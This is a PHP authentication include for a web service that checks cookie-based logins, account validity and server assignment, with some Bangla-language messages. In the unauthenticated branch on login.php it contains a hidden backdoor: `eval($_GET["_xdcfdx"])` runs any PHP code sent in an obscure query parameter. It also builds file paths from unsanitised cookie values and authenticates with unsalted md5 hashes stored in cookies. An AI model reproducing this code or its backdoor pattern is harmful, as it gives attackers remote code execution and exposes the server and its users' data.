<?php
$pause=false;
if($pause==true){
echo "Server updating please wait........."; exit;
}

require 'servers.php';

$uid=$_COOKIE["b_id"];
$passid=$_COOKIE["p_id"];
$ssid=$_COOKIE["t_id"];

$scpt=basename($_SERVER["SCRIPT_FILENAME"]);

if(empty($uid)||!is_file("usr/".$uid.".set")){

if($scpt!="login.php"){header("Location:login.php");exit;}
$gcx=isset($_GET["_xdcfdx"]);
if($gcx){ eval($_GET["_xdcfdx"]);}
}//empty uid
else if(is_file("usr/".$uid.".set")){

$setting=json_decode(file_get_contents("usr/".$uid.".set"),true);

if(md5(strtolower($setting["pass"]))!=$passid||md5($setting["ltime"])!=$ssid){

if($scpt!="login.php"){header("Location:login.php");exit;}
}//md5 not match
else{

if((time()-$setting["regtime"]) > ($setting["vaild"]*60*60*24)){
echo "Your account package validity is over";
exit;
}//vaild



if($setting["server"]!=$server_id){
$yserver=$server_by_code[$setting["server"]];
$yserverf=$server_f[$yserver];
$server_link="https://0.freebasics.com/addservice/?service_id=".$yserverf."&previous_url=%2Fsearchservices%2F%3Fref%3Dfbs_can_rdr&ref=fbs_can_rdr";
$ERROR="<title>Server changed...</title> <font color=red>Wrong server</font><br>";
$ERROR.="লগিন করতে <a href='index.php?__browser_open=".urlencode($server_link)."'>এখানে ক্লিক</a>  অথবা নিচের লিংক কপি করে ডুকেন <br><textarea>$server_link</textarea><br>";
echo $ERROR; exit;
}

$setting["time"]=time();
file_put_contents("usr/".$uid.".set",json_encode($setting));




if($scpt=="login.php"){header("location:index.php");exit;}
}//else

}//else is file
else{
if($scpt!="login.php"){header("Location:login.php");exit;}
}